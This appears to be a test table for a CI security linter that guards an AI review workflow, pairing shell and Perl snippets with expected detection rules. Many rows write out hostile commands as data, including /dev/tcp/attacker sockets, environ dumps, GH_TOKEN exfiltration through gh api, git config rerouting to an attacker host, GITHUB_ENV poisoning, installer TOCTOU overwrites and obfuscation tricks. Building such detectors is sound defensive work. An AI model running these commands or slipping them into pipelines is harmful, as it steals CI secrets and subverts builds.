# --- perl capability (Codex P1: IO::Socket + $ENV{GH_TOKEN} in ranges.pl) ---
t perl-use-socket 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}use IO::Socket::INET;"
t perl-env-token 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}print \$leak \$ENV{GH_TOKEN};"
t perl-socket-call 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}socket(my \$s, 2, 1, 6); connect(\$s, \$addr);"
t perl-use-constant 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}use constant FOO => 1;"
t perl-use-version-fp 0 "" happy.sarif "$P${FS}use warnings;${FS}a${FS}use v5.10;"
t perl-use-numeric-fp 0 "" happy.sarif "$P${FS}use warnings;${FS}a${FS}use 5.010;"
t perl-no-strict 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}no strict;"
t perl-disconnect-fp 0 "" happy.sarif "$P${FS}use warnings;${FS}a${FS}my \$x = disconnect(\$s);"
t perl-method-fp 0 "" happy.sarif "$P${FS}use warnings;${FS}a${FS}\$s->connect(\$a);"
t perl-core-connect 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}CORE::connect(\$s, \$a);"
t perl-env-dynamic 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}print \$ENV{\$k};"
t perl-env-home-fp 0 "" happy.sarif "$P${FS}use warnings;${FS}a${FS}my \$h = \$ENV{HOME};"
t perl-inline-use 1 "helper-perl-danger" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}perl -e 'use IO::Socket::INET;'"
t perl-inline-env 1 "helper-perl-danger" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}perl -0777 -pe 'print \$ENV{GH_TOKEN};'"

# --- installer tmp_bin aliases (Codex P1: replacement=$tmp_bin) ---
t toctou-alias 1 "muse-installer-toctou" happy.sarif "$I${FS}got_sha=${FS}a${FS}replacement=\"\${tmp_bin}\"${RS}$I${FS}replacement=\"\${tmp_bin}\"${FS}a${FS}cat \"\${GITHUB_WORKSPACE}/evil\" > \"\${replacement}\""
t toctou-alias-pre 1 "muse-installer-toctou" happy.sarif "$I${FS}tmp_bin=\"\$(mktemp)\"${FS}a${FS}replacement=\"\${tmp_bin}\"${RS}$I${FS}got_sha=${FS}a${FS}cat \"\${GITHUB_WORKSPACE}/evil\" > \"\${replacement}\""
t toctou-alias-chain 1 "muse-installer-toctou" happy.sarif "$I${FS}got_sha=${FS}a${FS}a=\"\${tmp_bin}\"${RS}$I${FS}a=\"\${tmp_bin}\"${FS}a${FS}b=\"\${a}\"${RS}$I${FS}b=\"\${a}\"${FS}a${FS}cat /tmp/evil > \"\${b}\""
t toctou-alias-inert-fp 0 "" happy.sarif "$I${FS}got_sha=${FS}a${FS}replacement=\"\${tmp_bin}\""
t toctou-alias-read 1 "muse-installer-toctou" happy.sarif "$I${FS}tmp_bin=\"\$(mktemp)\"${FS}a${FS}read replacement <<< \"\${tmp_bin}\"${RS}$I${FS}got_sha=${FS}a${FS}cat /tmp/evil > \"\${replacement}\""
t toctou-alias-printfv 1 "muse-installer-toctou" happy.sarif "$I${FS}tmp_bin=\"\$(mktemp)\"${FS}a${FS}printf -v replacement '%s' \"\${tmp_bin}\"${RS}$I${FS}got_sha=${FS}a${FS}cat /tmp/evil > \"\${replacement}\""
t toctou-alias-for 1 "muse-installer-toctou" happy.sarif "$I${FS}tmp_bin=\"\$(mktemp)\"${FS}a${FS}for replacement in \"\${tmp_bin}\"; do :; done${RS}$I${FS}got_sha=${FS}a${FS}cat /tmp/evil > \"\${replacement}\""

# --- indirect token expansion (Codex P1: ${!secret_name}) ---
t stage-indirect 1 "helper-secret-expand" happy.sarif "$PR${FS}} > \"\${prompt_file}\"${FS}a${FS}secret_name=GH_TOKEN; printf '%s' \"\${!secret_name}\" >> \"\${prompt_file}\""
t stage-indirect-sub 1 "helper-secret-expand" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"\${!ref[0]}\""
t stage-indirect-keys-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"\${!arr[@]}\""
t stage-indirect-prefix-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"\${!GH_*}\""
t stage-singlequote-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo '\${GH_TOKEN}'"
t stage-singlequote-indirect-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo '\${!ref}'"

# --- varmap reassignment (Codex P1: loader+=ake staleness) ---
t varmap-plus-eq 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}loader=m; loader+=ake; \"\${loader}\" -C \"\${GITHUB_WORKSPACE}\" all"
t varmap-declare 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}loader=m; declare loader=make; \"\${loader}\" -C /tmp all"
t varmap-unset 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}loader=make; unset loader; \"\${loader}\" -C /tmp all"
t varmap-indented 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}loader=m${RS}$H${FS}loader=m${FS}a${FS}  loader=make${RS}$H${FS}  loader=make${FS}a${FS}\"\${loader}\" -C /tmp all"
t varmap-arith 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}loader=m; ((loader = 5)); \"\${loader}\" -C /tmp all"
t varmap-read 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}loader=m; read loader < /dev/null; \"\${loader}\" -C /tmp all"
t varmap-printfv 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}loader=m; printf -v loader '%s' x; \"\${loader}\" -C /tmp all"
t varmap-for 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}loader=m; for loader in a b; do :; done; \"\${loader}\" -C /tmp all"
t varmap-multiassign 1 "helper-unresolved-command" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}loader=old; export ziplog=x loader=new; \"\${loader}\" -C /tmp all"
t varmap-cmdsubst-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}x=\"\$(printf hi)\""

# --- CORE-qualified perl calls (Codex P1: CORE::open) ---
t perl-core-open 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}CORE::open(my \$fh, \"|-\", \"bash\", \"\$ENV{GITHUB_WORKSPACE}/evil.sh\");"
t perl-core-sysopen 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}CORE::sysopen(my \$fh, \$f, O_RDWR);"
t perl-core-system 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}CORE::system(\"id\");"
t perl-amp-open 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}&open(my \$fh, \"|-\", \"id\");"
t perl-foo-open-fp 0 "" happy.sarif "$P${FS}use warnings;${FS}a${FS}Foo::open(my \$fh, \"|-\", \"id\");"

# --- copy-class exec flags (Codex P1: tar --checkpoint-action, sed e) ---
t copy-tar-checkpoint 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar -cf /tmp/out.tar --checkpoint=1 --checkpoint-action=exec='bash \${GITHUB_WORKSPACE}/evil.sh' /dev/null"
t copy-tar-tocommand 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar -cf /tmp/x --to-command=/bin/sh /dev/null"
t copy-tar-compress 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar -cf /tmp/x -I evil /dev/null"
t copy-tar-plain-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar -cf /tmp/out.tar /dev/null"
t copy-sed-exec 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sed 's/x/y/e' /tmp/f"
t copy-sed-e-cmd 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sed -e '/pat/e' /tmp/f"
t copy-sed-w-trusted 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sed 'w \${SCRIPT_DIR}/x' /tmp/f"
t copy-sed-plain-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sed 's/x/y/g' /tmp/f"
t copy-sed-f-unpinned 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sed -f \"\${GITHUB_WORKSPACE}/evil.sed\" /tmp/f"
t copy-ed-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf 'w\nq\n' | ed /tmp/f"

# --- symlink-alias writes (Codex P1: ln -s SCRIPT_DIR) ---
t link-alias-write 1 "helper-symlink-alias" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ln -s \"\${SCRIPT_DIR}\" /tmp/review-scripts${RS}$H${FS}ln -s \"\${SCRIPT_DIR}\"${FS}a${FS}cp \"\${GITHUB_WORKSPACE}/evil.sh\" /tmp/review-scripts/diff.sh"
t link-src-relative 1 "helper-symlink-alias" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ln -s ../scripts/x /tmp/l"
t link-src-workspace 1 "helper-symlink-alias" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ln -s \"\${GITHUB_WORKSPACE}/x\" /tmp/l"
t link-src-system-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ln -s /usr/bin/tool /tmp/t"
t link-hardlink-tmp-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ln /tmp/a /tmp/b"
t link-cp-symlink 1 "helper-symlink-alias" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cp -s \"\${SCRIPT_DIR}/x\" /tmp/l"
t link-targetdir 1 "helper-symlink-alias" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ln -s -t /tmp/links \"\${SCRIPT_DIR}/a\" \"\${SCRIPT_DIR}/b\""

# --- perl comment handling (Codex P1: q(#) truncation) ---
t perl-q-comment 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}my \$marker = q(#); system(\"bash\", \"\$ENV{GITHUB_WORKSPACE}/evil.sh\");"
t perl-comment-code 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}a${FS}# system(\"id\");"
t perl-regex-hash-fp 0 "" happy.sarif "$P${FS}use warnings;${FS}a${FS}my \$x = (\$y =~ s/#//r);"

# --- xargs dispatch (Codex P1: xargs bash evil.sh) ---
t xargs-bash 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf x | xargs bash evil.sh"
t xargs-git-clone 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf x | xargs git clone evil"
t xargs-argfile 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf x | xargs -a \"\${GITHUB_WORKSPACE}/evil\" echo"
t xargs-slotvar 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf x | xargs --process-slot-var=PATH echo"

# --- compare fail-closed shape (Codex P1: && false neutralizer) ---
t cmp-and-false 1 "muse-installer-no-compare" happy.sarif "$I${FS}if [[ \"\${got_sha}\"${FS}r${FS}[[ \"\${got_sha}\" != \"\${want_sha}\" ]]${FS}[[ \"\${got_sha}\" != \"\${want_sha}\" && false ]]"
t cmp-single-quote 1 "muse-installer-no-compare" happy.sarif "$I${FS}if [[ \"\${got_sha}\"${FS}r${FS}\"\${got_sha}\"${FS}'\${got_sha}'"
t cmp-eq-inverted 1 "muse-installer-no-compare" happy.sarif "$I${FS}if [[ \"\${got_sha}\"${FS}r${FS}!=${FS}=="
t cmp-bare-exit 1 "muse-installer-no-compare" happy.sarif "$I${FS}3:exit 1${FS}r${FS}exit 1${FS}exit"
t cmp-no-exit 1 "muse-installer-no-compare" happy.sarif "$I${FS}3:exit 1${FS}d"
t cmp-single-bracket-fp 0 "" happy.sarif "$I${FS}if [[ \"\${got_sha}\"${FS}r${FS}[[${FS}[${RS}$I${FS}if [ \"\${got_sha}\"${FS}r${FS}]]${FS}]"
t cmp-sha256c-fp 0 "" happy.sarif "$I${FS}if [[ \"\${got_sha}\"${FS}r${FS}if [[ \"\${got_sha}\" != \"\${want_sha}\" ]]; then${FS}if false; then${RS}$I${FS}got_sha=${FS}a${FS}sha256sum -c \"\${SCRIPT_DIR}/checksums.txt\""
t cmp-or-true 1 "muse-installer-no-compare" happy.sarif "$I${FS}if [[ \"\${got_sha}\"${FS}r${FS}if [[ \"\${got_sha}\" != \"\${want_sha}\" ]]; then${FS}if false; then${RS}$I${FS}got_sha=${FS}a${FS}sha256sum -c x || true"

# --- runner command files (Codex P1: GITHUB_ENV/GITHUB_PATH writes) ---
t cmdf-env-poison 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"BASH_ENV=\${GITHUB_WORKSPACE}/evil.sh\" >> \"\${GITHUB_ENV}\""
t cmdf-env-path 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"PATH=/evil\" >> \"\$GITHUB_ENV\""
t cmdf-env-benign-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"MY_VAR=hello\" >> \"\$GITHUB_ENV\""
t cmdf-env-cat 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat staged.txt >> \"\$GITHUB_ENV\""
t cmdf-env-cmdsub 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"\$(id)\" >> \"\$GITHUB_ENV\""
t cmdf-env-tee 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tee \"\$GITHUB_ENV\" < data.txt"
t cmdf-env-cp 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cp staged.txt \"\$GITHUB_ENV\""
t cmdf-env-hd 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat <<EOF >> \"\$GITHUB_ENV\"${RS}$H${FS}cat <<EOF >>${FS}a${FS}BASH_ENV=/evil${RS}$H${FS}BASH_ENV=/evil${FS}a${FS}EOF"
t cmdf-path-rel 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo rel/bin >> \"\$GITHUB_PATH\""
t cmdf-path-abs-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo /opt/bin >> \"\$GITHUB_PATH\""
t cmdf-path-var-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"\$HOME/bin\" >> \"\$GITHUB_PATH\""
t cmdf-path-empty 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo >> \"\$GITHUB_PATH\""

# --- hidden dispatch (Codex P1: alias/shopt expand_aliases) ---
t alias-def 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}alias leak='bash /tmp/evil'"
t alias-query-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}alias leak"
t shopt-expand 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}shopt -s expand_aliases"
t shopt-query-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}shopt expand_aliases"
t shopt-other-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}shopt -s nullglob"
t alias-p1-mutation 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}shopt -s expand_aliases${RS}$H${FS}shopt -s expand_aliases${FS}a${FS}alias leak='bash \"\${GITHUB_WORKSPACE}/evil.sh\"'${RS}$H${FS}alias leak='bash${FS}a${FS}leak"

# --- nameref indirection (Codex P1: declare -n blinds secret/tmp rules) ---
t nameref-secret 1 "helper-secret-expand" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare -n secret_ref=GH_TOKEN; printf '%s' \"\$secret_ref\" >> \"\${prompt_file}\""
t nameref-clean-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare -n ref=MY_VAR${RS}$H${FS}declare -n ref=MY_VAR${FS}a${FS}echo \"\$ref\""
t toctou-alias-nameref 1 "muse-installer-toctou" happy.sarif "$I${FS}got_sha=${FS}a${FS}declare -n replacement=tmp_bin; cat \"\${GITHUB_WORKSPACE}/evil\" > \"\${replacement}\""
t toctou-alias-nameref-inert-fp 0 "" happy.sarif "$I${FS}got_sha=${FS}a${FS}declare -n replacement=tmp_bin"

# --- trusted-path traversal (Codex P1: SCRIPT_DIR/../../evil) ---
t traversal-script 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}bash \"\${SCRIPT_DIR}/../../../../evil.sh\""
t traversal-mid 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}bash \"\${SCRIPT_DIR}/a/../../evil.sh\""
t traversal-inner-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}bash \"\${SCRIPT_DIR}/sub/../guard.sh\""
t traversal-var 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}bash \"\${SCRIPT_DIR}/\$x\""
t traversal-direct 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}\"\${SCRIPT_DIR}/../../../../evil.sh\""
t traversal-abs 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/usr/bin/../../home/evil/x"
t traversal-abs-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/usr/bin/jq --version"

# --- dynamic builtins (Codex P1: enable -f evil.so) ---
t enable-so 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}enable -f \"\${GITHUB_WORKSPACE}/evil.so\" evil"
t enable-disable 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}enable -n echo"
t enable-query-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}enable -p"

# --- gh confinement (Codex P1: gh api POST + gh auth token) ---
t gh-exfil 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method POST \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}/reviews\" -f event=COMMENT -f body=\"\$(gh auth token)\""
t gh-auth-token 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh auth token"
t gh-subcommand 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh pr merge 1"
t gh-hostname 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --hostname evil.com repos/x"
t gh-put 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method PUT repos/x -f a=b"
t gh-input-evil 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method POST \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}/reviews\" --input /etc/passwd"
t gh-field-evil 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method POST \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}/reviews\" --input \"\${RUNNER_TEMP}/muse-review-payload.json\" -f extra=1"
t gh-post-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method POST \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}/reviews\" --input \"\${RUNNER_TEMP}/muse-review-payload.json\""
t gh-get-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}\""
t gh-method-last 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method GET -X POST repos/evil/x"
t gh-repo-flag 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api -R evil/repo \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}\""
t gh-jq-second 1 "helper-jq-env" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api repos/x --jq .safe --jq '\$ENV.GH_TOKEN'"
t gh-host-assign 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}GH_HOST=evil.com"

# --- coproc execution (Codex P1: coproc bash evil.sh) ---
t coproc-bash 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}coproc bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t coproc-named 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}coproc FOO cat /tmp/x"

# --- command hash (Codex P1: hash -p evil innocent) ---
t hash-p 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}hash -p \"\${GITHUB_WORKSPACE}/evil.sh\" innocent; innocent"
t hash-query-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}hash -r"

# --- wrapper options (Codex P1: exec -a hides bash) ---
t peel-exec-a 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}exec -a harmless bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t peel-exec-dd 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}exec -- bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t peel-command-p 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}command -p bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t peel-command-v-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}command -v gh"
t peel-time-p 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}time -p bash \"\${GITHUB_WORKSPACE}/evil.sh\""

# --- escaped/concatenated commands (Codex P1: ba\sh, c\url) ---
t esc-bash 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}ba\\sh \"\${GITHUB_WORKSPACE}/evil.sh\""
t esc-curl 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}c\\url https://evil/x"
t esc-concat 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}b\"\"ash \"\${GITHUB_WORKSPACE}/evil.sh\""
t esc-concat-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}\"ec\"\"ho\" hi"
t esc-declare 1 "helper-secret-expand" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}declare \\s=\$GH_TOKEN; echo \"\$s\""

# --- socket redirects (Codex P1: /dev/tcp) ---
t socket-out 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo hi > /dev/tcp/attacker/443"
t socket-rw 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}exec 3<>/dev/tcp/attacker/443"
t socket-in 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat < /dev/tcp/attacker/443"
t socket-udp 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo hi > /dev/udp/attacker/53"
t socket-esc 1 "helper-network-tool" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo hi > /d\\ev/tcp/attacker/443"
t socket-quoted-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo \"/dev/tcp/attacker/443\""

# --- fd aliases (Codex P1: exec 3<>tmp + /proc/self/fd/3) ---
t toctou-fd 1 "muse-installer-toctou" happy.sarif "$I${FS}tmp_bin=\"\$(mktemp)\"${FS}a${FS}exec 3<>\"\${tmp_bin}\"${RS}$I${FS}got_sha=${FS}a${FS}cat evil > /proc/self/fd/3"
t toctou-fd-dup 1 "muse-installer-toctou" happy.sarif "$I${FS}tmp_bin=\"\$(mktemp)\"${FS}a${FS}exec 3<>\"\${tmp_bin}\"${RS}$I${FS}got_sha=${FS}a${FS}cat evil >&3"
t toctou-fd-stderr-fp 0 "" happy.sarif "$I${FS}got_sha=${FS}a${FS}echo x 2>/dev/null"

# --- alternate shells (Codex P1: dash evil.sh) ---
t altshell-dash 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}dash evil.sh"
t altshell-zsh 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}zsh \"\${GITHUB_WORKSPACE}/evil.sh\""
t altshell-bound-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}dash \"\${SCRIPT_DIR}/guard.sh\""

# --- environment reads (Codex P1: base64 /proc/self/environ) ---
t environ-b64 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}base64 /proc/self/environ"
t environ-cat 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat /proc/self/environ"
t environ-dd 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}dd if=/proc/1234/environ"
t environ-quoted 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat \"/proc/self/environ\""
t environ-comment-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}echo hi # /proc/self/environ"

# --- AWK aliases (Codex P1: mawk system() evasion) ---
t awk-mawk-system 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}mawk 'BEGIN { system(\\\"bash \\\\\\\"\${GITHUB_WORKSPACE}/evil.sh\\\\\\\"\\\") }'"
t awk-gawk-versioned 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk-5.3 'BEGIN{system(\\\"id\\\")}'"
t awk-mawk-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}mawk '{print \$1}' /dev/null"

# --- procfs aliases (Codex P1: /proc/self/root/.../environ) ---
t environ-procroot 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}base64 /proc/self/root/proc/self/environ"
t environ-dotdot 1 "helper-env-dump" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cat /proc/self/../self/environ"

# --- git config parameters (Codex P1: GIT_CONFIG_PARAMETERS) ---
t helper-git-config-parameters 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}printf -v GIT_CONFIG_PARAMETERS '%s' \"'core.sshCommand=./evil.sh' 'url.https://attacker/.insteadOf=https://github.com/'\"; git fetch origin"
t helper-git-config-parameters-bare 1 "helper-env-poison" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}GIT_CONFIG_PARAMETERS=x"

# --- gh field-implied POST (Codex P1: gh api -f without --method) ---
t gh-field-post 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api \"repos/\${GITHUB_REPOSITORY}/pulls/\${PR_NUMBER}/reviews\" -f event=COMMENT -f body=pwned"
t gh-rawfield-post 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api repos/x -F a=@/etc/passwd"
t gh-get-fields-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gh api --method GET repos/x -f a=b"

# --- bracket token expressions (Codex P1: secrets['GITHUB_TOKEN']) ---
t agent-bracket-token 1 "agent-token-expression" happy.sarif "$S${FS}META_API_KEY: \${{ secrets.META_API_KEY }}${FS}a${FS}          LEAKED_GITHUB_TOKEN: \${{ secrets['GITHUB_TOKEN'] }}"
t agent-bracket-github-token 1 "agent-token-expression" happy.sarif "$S${FS}META_API_KEY: \${{ secrets.META_API_KEY }}${FS}a${FS}          X: \${{ github[\"token\"] }}"
t agent-computed-secret 1 "agent-token-expression" happy.sarif "$S${FS}META_API_KEY: \${{ secrets.META_API_KEY }}${FS}a${FS}          X: \${{ secrets[env.NAME] }}"

# --- absolute wrapper paths (Codex P1: /usr/bin/timeout) ---
t wrapper-timeout-abs 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}/usr/bin/timeout 5s bash \"\${GITHUB_WORKSPACE}/evil.sh\""
t wrapper-timeout-evil 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}./timeout 5s bash \"\${SCRIPT_DIR}/guard.sh\""

# --- prompt transforms (Codex P1: ${var@P}) ---
t deferred-atp 1 "helper-deferred-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}payload='\$(bash evil.sh)'${RS}$H${FS}payload='\$(bash evil.sh)'${FS}a${FS}echo \"\${payload@P}\""

# --- java/run-parts loaders (Codex P1: java Evil.java, run-parts) ---
t loader-java 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}java Evil.java"
t loader-runparts 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}run-parts \"\${GITHUB_WORKSPACE}/evil.d\""

# --- prompt_file pin (Codex P1: prompt_file rebind) ---
